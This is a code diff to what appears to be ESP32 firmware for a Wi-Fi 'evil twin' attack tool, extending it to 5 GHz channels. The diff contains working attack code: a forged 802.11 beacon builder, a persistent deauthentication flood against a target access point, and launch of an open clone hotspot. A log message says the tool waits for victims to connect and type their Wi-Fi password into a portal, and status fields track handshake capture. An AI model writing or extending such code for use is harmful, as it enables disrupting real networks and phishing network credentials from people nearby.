@@ -177,7 +177,7 @@ struct Target {
   int    channel = 0;
   int    rssi    = 0;
 };
-static Target sTarget;   // 主目标: 必须 2.4G, 克隆热点与持续 Deauth 的对象
+static Target sTarget;   // 主目标: 克隆热点与持续 Deauth 的对象 (2.4G 或 5G 非 DFS)
 
 /* 双子目标列表 (可增删, 最多 MAX_TWINS 条): 通常是同一路由器另一个 BSSID;
  * 勾选「假 AP」时, 攻击跳频到该信道还额外广播一个伪造信标 (空口上真能看到)。 */
@@ -333,35 +333,6 @@ static void buildDeauthFrame(DeauthEngine &d) {
   d.frameReady = buildDeauthFrameRaw(d.targetBssid, d.reasonCode, d.frame);
 }
 
-// 构建伪造信标帧 (802.11 管理帧 Subtype=8) —— 「假 AP」用: 跳频到该信道时广播,
-// 空口上真的能扫到这个 SSID。buffer 至少 120 字节, 返回实际帧长 (0 = BSSID 非法)。
-static uint16_t buildBeaconFrame(const String &ssidIn, const String &bssidIn, uint8_t channel, uint8_t *f) {
-  uint8_t mac[6];
-  String bssid = bssidIn;
-  bssid.trim();
-  if (!parseBssid(bssid, mac)) return 0;
-  String ssid = ssidIn;
-  if (ssid.length() > 32) ssid = ssid.substring(0, 32);
-  static const uint8_t BROADCAST[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
-  static const uint8_t RATES[8] = {0x82, 0x84, 0x8B, 0x96, 0x0C, 0x12, 0x18, 0x24};
-  uint16_t i = 0;
-  f[i++] = 0x80; f[i++] = 0x00;              // Frame Control: 管理 / Beacon
-  f[i++] = 0x00; f[i++] = 0x00;              // Duration
-  memcpy(f + i, BROADCAST, 6); i += 6;       // Address 1: 广播
-  memcpy(f + i, mac, 6); i += 6;             // Address 2: BSSID (伪造)
-  memcpy(f + i, mac, 6); i += 6;             // Address 3: BSSID
-  f[i++] = 0x00; f[i++] = 0x00;              // Sequence Control
-  for (int k = 0; k < 8; k++) f[i++] = 0x00; // Timestamp
-  f[i++] = 0x64; f[i++] = 0x00;              // Beacon Interval (100 TU)
-  f[i++] = 0x01; f[i++] = 0x04;              // Capability: ESS + ShortSlot, 不加密
-  f[i++] = 0x00; f[i++] = (uint8_t)ssid.length();   // SSID IE
-  for (size_t k = 0; k < ssid.length(); k++) f[i++] = (uint8_t)ssid[k];
-  f[i++] = 0x01; f[i++] = 0x08;              // Supported Rates IE
-  for (int k = 0; k < 8; k++) f[i++] = RATES[k];
-  f[i++] = 0x03; f[i++] = 0x01; f[i++] = channel;   // DS Parameter (信道)
-  return i;
-}
-
 /* ---------------- 双频信道模型 (P0: 5GHz 仅 C5) ----------------
  * 2.4G: ch 1..14; 5G: ch 36..165。两组信道号不重叠, 因此 band 可由信道号推导,
  * 不必在 API/状态里重复传 band (API 仍接受可选 band 字段以指定跳频起点)。
@@ -437,6 +408,60 @@ static uint8_t hopStartChannel(uint8_t band, uint8_t fallback) {
 #endif
   if (band == 2 && isBand5G(fallback)) return 1;
   return fallback;
+}
+
+// AP 热点可用信道: 2.4G 1..13; 5G 仅非 DFS (36-48 / 149-165)。
+// DFS 信道 (52-144) 作为 AP 需先做雷达检测 (CAC), softAP 不支持, 故不开放。
+static bool isValidApChannel(int ch) {
+  if (ch >= 1 && ch <= 13) return true;
+#if SOC_WIFI_SUPPORT_5G
+  return isValid5GChannel(ch) && !isDfs5G((uint8_t)ch);
+#else
+  return false;
+#endif
+}
+
+// 邪恶双子「克隆热点」可用信道: 2.4G 1..14 (允许日本 14ch) 或 5G 非 DFS。
+// 克隆热点与主目标同信道启动 → 主目标信道必须能起 AP。
+static bool isValidCloneChannel(int ch) {
+  if (ch >= 1 && ch <= 14) return true;
+#if SOC_WIFI_SUPPORT_5G
+  return isValid5GChannel(ch) && !isDfs5G((uint8_t)ch);
+#else
+  return false;
+#endif
+}
+
+// 构建伪造信标帧 (802.11 管理帧 Subtype=8) —— 「假 AP」用: 跳频到该信道时广播,
+// 空口上真的能扫到这个 SSID。buffer 至少 120 字节, 返回实际帧长 (0 = BSSID 非法)。
+static uint16_t buildBeaconFrame(const String &ssidIn, const String &bssidIn, uint8_t channel, uint8_t *f) {
+  uint8_t mac[6];
+  String bssid = bssidIn;
+  bssid.trim();
+  if (!parseBssid(bssid, mac)) return 0;
+  String ssid = ssidIn;
+  if (ssid.length() > 32) ssid = ssid.substring(0, 32);
+  static const uint8_t BROADCAST[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
+  static const uint8_t RATES[8] = {0x82, 0x84, 0x8B, 0x96, 0x0C, 0x12, 0x18, 0x24};
+  uint16_t i = 0;
+  f[i++] = 0x80; f[i++] = 0x00;              // Frame Control: 管理 / Beacon
+  f[i++] = 0x00; f[i++] = 0x00;              // Duration
+  memcpy(f + i, BROADCAST, 6); i += 6;       // Address 1: 广播
+  memcpy(f + i, mac, 6); i += 6;             // Address 2: BSSID (伪造)
+  memcpy(f + i, mac, 6); i += 6;             // Address 3: BSSID
+  f[i++] = 0x00; f[i++] = 0x00;              // Sequence Control
+  for (int k = 0; k < 8; k++) f[i++] = 0x00; // Timestamp
+  f[i++] = 0x64; f[i++] = 0x00;              // Beacon Interval (100 TU)
+  f[i++] = 0x01; f[i++] = 0x04;              // Capability: ESS + ShortSlot, 不加密
+  f[i++] = 0x00; f[i++] = (uint8_t)ssid.length();   // SSID IE
+  for (size_t k = 0; k < ssid.length(); k++) f[i++] = (uint8_t)ssid[k];
+  f[i++] = 0x01; f[i++] = 0x08;              // Supported Rates IE
+  for (int k = 0; k < 8; k++) f[i++] = RATES[k];
+  // DS Parameter (信道): 仅 2.4G 信标携带; 5G 客户端按中心频率推信道, 带 DS IE 反而违规
+  if (!isBand5G(channel)) {
+    f[i++] = 0x03; f[i++] = 0x01; f[i++] = channel;
+  }
+  return i;
 }
 
 // 临时切换 AP 空口信道到 ch (不修改 NVS 配置); 成功返回 true。ch 支持 2.4G(1-14) 与 5G(32-177, 仅双频芯片)。
@@ -1002,10 +1027,25 @@ static const uint8_t  TWIN_HOP_TX_GAP_MS   = 80;    // 跳频窗口内帧间隔
 
 // 启动真实攻击: 失败返回 false 并在 err 给出中文原因
 static bool eviltwinStartAttack(String &err) {
-  if (!sTarget.set || sTarget.channel < 1 || sTarget.channel > 14) {
-    err = "主目标必须是 2.4G 频段 (信道 1-14): 克隆热点只能工作在 2.4G, 请先把 2.4G 信号设为主目标";
+  // 主目标信道必须能起克隆热点: 2.4G 1-14 (全芯片) 或 5G 非 DFS (仅双频芯片)。
+  // 5G DFS 信道 (52-144) 无法作为 AP 驻留, 主目标是 DFS 时应改用「双子目标」做压制。
+  if (!sTarget.set || sTarget.channel < 1) {
+    err = "无可用主目标: 请先扫描并设置目标 AP";
     return false;
   }
+#if !SOC_WIFI_SUPPORT_5G
+  if (sTarget.channel > 14) {
+    err = "主目标必须是 2.4G 频段 (信道 1-14): 本芯片仅支持 2.4GHz";
+    return false;
+  }
+#else
+  if (!isValidCloneChannel(sTarget.channel)) {
+    err = isDfs5G((uint8_t)sTarget.channel)
+          ? "主目标在 5G DFS 信道 (52-144): 克隆热点无法驻留 DFS, 请把该 AP 加入「双子目标」改用跳频压制"
+          : "主目标信道无效: 2.4G 用 1-14, 5G 仅开放 36-48 / 149-165";
+    return false;
+  }
+#endif
   if (sEvilTwin.cloneSsid.length() == 0) sEvilTwin.cloneSsid = sTarget.ssid;
   if (sEvilTwin.cloneSsid.length() == 0) { err = "无可用克隆 SSID: 请先设置主目标"; return false; }
 
@@ -1201,6 +1241,7 @@ static String targetJson(const Target &t) {
   j += "\"ssid\":\"" + jsonEscape(t.ssid) + "\",";
   j += "\"bssid\":\"" + jsonEscape(t.bssid) + "\",";
   j += "\"channel\":" + String(t.channel) + ",";
+  j += "\"band\":" + String(isBand5G((uint8_t)t.channel) ? 5 : 2) + ",";
   j += "\"rssi\":" + String(t.rssi) + ",";
   j += "\"auth\":\"" + jsonEscape(t.auth) + "\"}";
   return j;
@@ -1255,7 +1296,8 @@ static void sendInfo() {
   json += "\"deauth\":{\"running\":" + String(sDeauth.running ? "true" : "false") +
           ",\"count\":" + String(sDeauth.frameCount) +
           ",\"rate\":" + String(sDeauth.rateLimitMs ? (1000 / sDeauth.rateLimitMs) : 10) +
-          ",\"channel\":" + String(sDeauth.targetChannel) + "},";
+          ",\"channel\":" + String(sDeauth.targetChannel) +
+          ",\"band\":" + String(isBand5G(sDeauth.targetChannel) ? 5 : 2) + "},";
   json += "\"handshake\":{\"capturing\":" + String(sHandshake.capturing ? "true" : "false") +
           ",\"captured\":" + String(sHandshake.captured ? "true" : "false") +
           ",\"keyver\":" + String(sHandshake.keyver) +
@@ -1286,6 +1328,7 @@ static void sendInfo() {
             ",\"ssid\":\"" + jsonEscape(sTwins[i].ssid) +
             "\",\"bssid\":\"" + jsonEscape(sTwins[i].bssid) +
             "\",\"channel\":" + String(sTwins[i].channel) +
+            ",\"band\":" + String(isBand5G((uint8_t)sTwins[i].channel) ? 5 : 2) +
             ",\"auth\":\"" + jsonEscape(sTwins[i].auth) +
             "\",\"rssi\":" + String(sTwins[i].rssi) +
             ",\"fakeAp\":" + String(sTwins[i].fakeAp ? "true" : "false") +
@@ -1367,10 +1410,16 @@ static void handleTarget() {
   t.bssid.trim();
   t.auth.trim();
 
-  // 主目标约束: 克隆热点只能工作在 2.4G
-  if (t.channel < 1 || t.channel > 14) {
+  // 主目标约束: 2.4G 1-14 (全芯片) 或 5G 信道表内 (仅双频芯片)
+  if (!isValidSniffChannel(t.channel)) {
+    server.sendHeader("Access-Control-Allow-Origin", "*");
+#if SOC_WIFI_SUPPORT_5G
     server.send(400, "application/json",
-                "{\"ok\":false,\"error\":\"主目标必须是 2.4G 频段 (信道 1-14); 5G 信号请加入「双子目标」列表\"}");
+                "{\"ok\":false,\"error\":\"主目标信道无效: 2.4G 用 1-14, 5G 用 36-165\"}");
+#else
+    server.send(400, "application/json",
+                "{\"ok\":false,\"error\":\"主目标必须是 2.4G 频段 (信道 1-14): 本芯片仅支持 2.4GHz\"}");
+#endif
     return;
   }
 
@@ -1398,8 +1447,14 @@ static void handleTwinAdd() {
   int channel = extractJson(body, "channel").toInt();
   bool fakeAp = (extractJson(body, "fakeAp") == "true");
 
-  if (channel < 1 || channel > 177) {
-    server.send(400, "application/json", "{\"ok\":false,\"error\":\"双子目标需要有效信道\"}");
+  // 双子目标信道: 2.4G 1-14 或 5G 信道表内 (含 DFS, 双子只做跳频注入/假 AP, 不起热点)
+  if (!isValidSniffChannel(channel)) {
+    server.sendHeader("Access-Control-Allow-Origin", "*");
+#if SOC_WIFI_SUPPORT_5G
+    server.send(400, "application/json", "{\"ok\":false,\"error\":\"双子目标信道无效: 2.4G 用 1-14, 5G 用 36-165\"}");
+#else
+    server.send(400, "application/json", "{\"ok\":false,\"error\":\"双子目标信道无效: 本芯片仅支持 2.4G 信道 1-14\"}");
+#endif
     return;
   }
   if (bssid.length() == 0 && !fakeAp) {
@@ -1480,7 +1535,8 @@ static void handleEvilTwinStart() {
   sEvilTwin.startTime = millis();
   emitLabState("eviltwin", true);
   log("[eviltwin] 攻击已发起! 克隆热点=" + sEvilTwin.cloneSsid + " (开放无密码 @ch" +
-      String(sTarget.channel) + "), 主目标持续 Deauth, 双子目标 " + String(twinCount()) + " 条" +
+      String(sTarget.channel) + (isBand5G((uint8_t)sTarget.channel) ? " 5G" : " 2.4G") +
+      "), 主目标持续 Deauth, 双子目标 " + String(twinCount()) + " 条" +
       (sEvilTwin.hopEnabled ? " 已启用跳频轮播" : " (无有效条目, 仅 2.4G 单频段攻击)") +
       " — 等待目标设备接入并在门户输入密码");
   server.sendHeader("Access-Control-Allow-Origin", "*");
@@ -1536,6 +1592,15 @@ static void handleDeauthStart() {
     String b = extractJson(body, "bssid");
     if (b.length()) sDeauth.targetBssid = b;
     int ch = extractJson(body, "channel").toInt();
+    if (ch > 0 && !isValidSniffChannel(ch)) {
+      server.sendHeader("Access-Control-Allow-Origin", "*");
+#if SOC_WIFI_SUPPORT_5G
+      server.send(400, "application/json", "{\"ok\":false,\"error\":\"无效信道: 2.4G 用 1-14, 5G 用 36-165\"}");
+#else
+      server.send(400, "application/json", "{\"ok\":false,\"error\":\"无效信道: 本芯片仅支持 2.4G 信道 1-14\"}");
+#endif
+      return;
+    }
     if (ch > 0) sDeauth.targetChannel = ch;
     int r = extractJson(body, "reason").toInt();
     if (r > 0) sDeauth.reasonCode = r;
@@ -1613,6 +1678,7 @@ static void handleDeauthStatus() {
   json += "\"rate\":" + String(sDeauth.rateLimitMs ? (1000 / sDeauth.rateLimitMs) : 10) + ",";
   json += "\"bssid\":\"" + jsonEscape(sDeauth.targetBssid) + "\",";
   json += "\"channel\":" + String(sDeauth.targetChannel) + ",";
+  json += "\"band\":" + String(isBand5G(sDeauth.targetChannel) ? 5 : 2) + ",";
   json += "\"reason\":" + String(sDeauth.reasonCode) + ",";
   json += "\"injected\":" + String(sDeauth.frameReady ? "true" : "false") + ",";
   json += "\"txOk\":" + String(sDeauth.txOk ? "true" : "false") + ",";
@@ -2044,6 +2110,14 @@ static void handleGetConfig() {
   server.sendHeader("Access-Control-Allow-Origin", "*");
   String json = "{";
   json += "\"channel\":" + String(apChannel) + ",";
+  json += "\"band\":" + String(isBand5G(apChannel) ? 5 : 2) + ",";
+  json += "\"band5g\":" + String(
+#if SOC_WIFI_SUPPORT_5G
+                              "true"
+#else
+                              "false"
+#endif
+                              ) + ",";
   json += "\"ssid\":\"" + jsonEscape(apSsid) + "\"";
   json += "}";
   server.send(200, "application/json", json);
@@ -2263,7 +2337,6 @@ static void handleSerialCli() {
   }
 }
 
-
 static void handleConfig() {
   if (!server.hasArg("plain")) {
     server.send(400, "application/json", "{\"error\":\"missing body\"}");
@@ -2274,11 +2347,20 @@ static void handleConfig() {
   bool changed = false;
   if (chStr.length()) {
     int ch = chStr.toInt();
-    if (ch >= 1 && ch <= 13) {
+    if (isValidApChannel(ch)) {
       apChannel = (uint8_t)ch;
       sPrefs.putUChar("channel", apChannel);
       changed = true;
-      log("[config] 已更新热点信道配置为 " + String(apChannel) + " (将在重启后生效)");
+      log("[config] 已更新热点信道配置为 " + String(apChannel) +
+          (isBand5G(apChannel) ? " (5G)" : " (2.4G)") + " (将在重启后生效)");
+    } else {
+      server.sendHeader("Access-Control-Allow-Origin", "*");
+#if SOC_WIFI_SUPPORT_5G
+      server.send(400, "application/json", "{\"ok\":false,\"error\":\"无效信道: 2.4G 用 1-13, 5G 仅开放 36-48 / 149-165 (DFS 信道不能做热点)\"}");
+#else
+      server.send(400, "application/json", "{\"ok\":false,\"error\":\"无效信道: 本芯片仅支持 2.4G 信道 1-13\"}");
+#endif
+      return;
     }
   }
   String ssidStr = extractJson(body, "ssid");
@@ -2405,7 +2487,7 @@ void setup() {
 
   sPrefs.begin("esp32-cfg", false);
   apChannel = sPrefs.getUChar("channel", AP_CHANNEL_DEFAULT);
-  if (apChannel < 1 || apChannel > 13) apChannel = AP_CHANNEL_DEFAULT;
+  if (!isValidApChannel(apChannel)) apChannel = AP_CHANNEL_DEFAULT;
   sAdminToken = sPrefs.getString("adminToken", "");   // 空串 = 尚未初始化, 待 RF 开启后生成随机口令
 
   uint8_t apMac[6];
@@ -2422,7 +2504,8 @@ void setup() {
     WiFi.softAP(apSsid.c_str(), AP_PASSWORD, apChannel, false, 4);
   }
   apChannelActive = apChannel;  // 记录开机实际信道 (后续攻击可临时切换, 配置值不变)
-  log("[wifi] AP 已启动: SSID=" + apSsid + "  密码=" + AP_PASSWORD + "  信道=" + String(apChannel));
+  log("[wifi] AP 已启动: SSID=" + apSsid + "  密码=" + AP_PASSWORD + "  信道=" +
+      String(apChannel) + (isBand5G(apChannel) ? " (5G)" : " (2.4G)"));
   log("[wifi] 后台: " + String(ADMIN_HTML_C));
   log("[system] 芯片: " + detectChipKey() + "  FreeHeap: " + String(ESP.getFreeHeap()) + " bytes");
   // 首次上电 / 恢复出厂 / 从旧版静态口令升级 → 轮换为设备唯一随机口令。
@@ -2445,7 +2528,8 @@ void setup() {
            "\",\"fw\":\"" FW_VERSION +
            "\",\"ssid\":\"" + jsonEscape(apSsid) +
            "\",\"mac\":\"" + formatMac(apMac) +
-           "\",\"channel\":" + String(apChannel));
+           "\",\"channel\":" + String(apChannel) +
+           ",\"band\":" + String(isBand5G(apChannel) ? 5 : 2));
 
   // 后台口令保护: 每台设备的初始口令由硬件 TRNG 生成并存 NVS, 首次登录引导改密
   static const char *adminHeaders[] = {"X-Admin-Token", "Content-Type"};
